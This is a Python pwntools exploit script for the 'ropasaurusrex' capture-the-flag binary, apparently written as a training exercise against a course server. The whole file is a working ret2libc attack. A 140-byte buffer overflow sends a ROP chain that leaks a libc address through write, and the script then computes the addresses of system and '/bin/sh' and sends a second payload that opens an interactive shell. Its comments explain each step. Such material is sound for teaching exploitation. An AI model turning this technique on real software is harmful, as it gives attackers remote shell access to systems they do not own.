from pwn import *


context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
	r = process("./ropasaurusrex")
	gdb.attach(r, """
	c
	""")
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 2014)


#First we need to change the library libc to the correct version and the loader if necessary


#LIBC = ELF("./libc-2.27.so") #alternative way 1 for finding system and binsh
#alternative way 1 help us to do things automatically without computing manually everything
#We still need to compute manually the base.
#Hence we can make this work with every library version just changing a few things only.

ptr_write = 0x0804830c
next_fun = 0x0804841d #In this case we want to reexecute the main
got = 0x08049614

payload = b"A"*140
payload += p32(ptr_write)
payload += p32(next_fun)
payload += p32(0) #Return address of next_fun (we don't care)
payload += p32(got)
payload += p32(4)

r.send(payload)

leak = u32(r.recv(4)) #unpack convert into integer
libc_base = leak - 0xe6d80 #leak - (value obtained by doing vmmap from the value pointed by the write @ got.plt.. sometimes full vmmap is required)
#LIBC.adress = libc_base #alternative way 1
#system = LIBC.symbols["system"] #alternative way 1
system = libc_base + 0x003d200
binsh = libc_base + 0x17e0cf
#binsh = next(LIBC.search(b"/bin/sh")) alternative way 1
print("[!] leak: %#x" % leak)
print("[!] libc: %#x" % libc_base)
print("[!] system: %#x" % system)
print("[!] binsh: %#x" % binsh)

#Now we have everything and we need to send our malicious payload.
#But we don't have another read. We can jump at the start of the main to redo the read.
#(In this way the memory does not change since we are in the same execution.

#address of system + return address of system (we don't care) + address of /bin/sh
payload2 = b"A"*140 #overflow
payload2 += p32(system) + p32(0) + p32(binsh) 
#System executes a command from shell which can be to open a permant shell. It accept a parameter which is binsh in this case.
#We searched in libc for the address of binsh

r.send(payload2)

r.interactive()